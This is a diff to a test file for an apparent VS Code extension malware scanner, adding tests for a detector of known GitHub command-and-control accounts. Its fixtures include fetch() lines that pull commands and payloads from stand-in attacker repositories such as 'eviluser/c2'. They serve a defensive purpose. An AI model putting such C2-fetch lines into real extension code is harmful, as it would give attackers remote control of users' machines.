@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest";
 import type { VsixContents, VsixManifest, ZooData } from "../types.js";
 import {
   checkDomains,
+  checkGithubC2,
   checkHashes,
   checkIocs,
   checkIps,
@@ -37,6 +38,7 @@ function makeZooData(overrides: Partial<ZooData> = {}): ZooData {
     wallets: new Set(),
     blockchainAllowlist: new Set(),
     telemetryServices: new Map(),
+    githubC2Accounts: new Set(),
     ...overrides,
   };
 }
@@ -467,5 +469,119 @@ describe("checkWallets SOL validation", () => {
 
     expect(findings).toHaveLength(1);
     expect(findings[0]?.metadata?.["currency"]).toBe("SOL");
+  });
+});
+
+describe("checkGithubC2", () => {
+  it("returns empty when githubC2Accounts is empty", () => {
+    const contents = makeContents({
+      "extension.js": 'fetch("https://github.com/evil/repo")',
+    });
+
+    const findings = checkGithubC2(contents, new Set());
+    expect(findings).toHaveLength(0);
+  });
+
+  it("detects github.com/{account}/ pattern", () => {
+    const contents = makeContents({
+      "extension.js": 'const url = "https://github.com/eviluser/c2repo/raw/main/cmd.txt";',
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.id).toBe("KNOWN_GITHUB_C2");
+    expect(findings[0]?.severity).toBe("critical");
+    expect(findings[0]?.metadata?.["account"]).toBe("eviluser");
+    expect(findings[0]?.metadata?.["matched"]).toBe("github.com/eviluser/");
+  });
+
+  it("detects api.github.com/repos/{account}/ pattern", () => {
+    const contents = makeContents({
+      "extension.js": 'fetch("https://api.github.com/repos/eviluser/c2/contents/cmd")',
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.metadata?.["matched"]).toBe("api.github.com/repos/eviluser/");
+  });
+
+  it("detects raw.githubusercontent.com/{account}/ pattern", () => {
+    const contents = makeContents({
+      "extension.js": 'fetch("https://raw.githubusercontent.com/eviluser/c2/main/payload")',
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.metadata?.["matched"]).toBe("raw.githubusercontent.com/eviluser/");
+  });
+
+  it("does not match unlisted accounts", () => {
+    const contents = makeContents({
+      "extension.js": 'fetch("https://github.com/legitimateuser/repo")',
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(0);
+  });
+
+  it("does not match partial account names", () => {
+    const contents = makeContents({
+      "extension.js": 'fetch("https://github.com/eviluserbot/repo/")',
+    });
+
+    // Trailing slash in pattern prevents partial match:
+    // pattern is "github.com/eviluser/" but content has "github.com/eviluserbot/"
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(0);
+  });
+
+  it("skips non-scannable files", () => {
+    const contents = makeContents({
+      "image.png": "https://github.com/eviluser/c2repo/",
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(0);
+  });
+
+  it("reports correct line number", () => {
+    const contents = makeContents({
+      "extension.js": [
+        "// line 1",
+        "// line 2",
+        'const url = "https://github.com/eviluser/c2repo/";',
+      ].join("\n"),
+    });
+
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(1);
+    expect(findings[0]?.location?.line).toBe(3);
+  });
+
+  it("produces one finding per account per file", () => {
+    const contents = makeContents({
+      "extension.js": [
+        'fetch("https://github.com/eviluser/repo1/");',
+        'fetch("https://api.github.com/repos/eviluser/repo2/");',
+        'fetch("https://raw.githubusercontent.com/eviluser/repo3/main/f");',
+      ].join("\n"),
+    });
+
+    // The break ensures only the first matching pattern
+    // produces a finding per account per file
+    const findings = checkGithubC2(contents, new Set(["eviluser"]));
+    expect(findings).toHaveLength(1);
+  });
+
+  it("detects multiple accounts in the same file", () => {
+    const contents = makeContents({
+      "extension.js": [
+        'fetch("https://github.com/attacker1/c2/");',
+        'fetch("https://github.com/attacker2/c2/");',
+      ].join("\n"),
+    });
+
+    const findings = checkGithubC2(contents, new Set(["attacker1", "attacker2"]));
+    expect(findings).toHaveLength(2);
   });
 });
